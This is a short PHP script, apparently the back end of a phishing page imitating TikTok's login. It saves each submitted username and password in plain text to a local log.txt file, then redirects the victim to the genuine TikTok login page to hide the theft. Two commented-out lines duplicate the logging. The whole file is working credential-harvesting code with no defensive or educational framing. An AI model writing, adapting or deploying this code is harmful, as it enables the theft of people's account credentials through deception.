<?php

$path = __DIR__ . "/log.txt";
$dataname = "Username: " . $_POST['username'] . "\n";
$datapass = "Pass: " . $_POST['password'] . "\n";
file_put_contents($path, $dataname);
file_put_contents($path, $datapass, FILE_APPEND);

#file_put_contents("log.txt", "Username: " . $_POST['username'] . "\n" );
#file_put_contents("log.txt", "Pass: " . $_POST['password'] ,  FILE_APPEND);
header ("location: https://www.tiktok.com/login");
exit();
?>
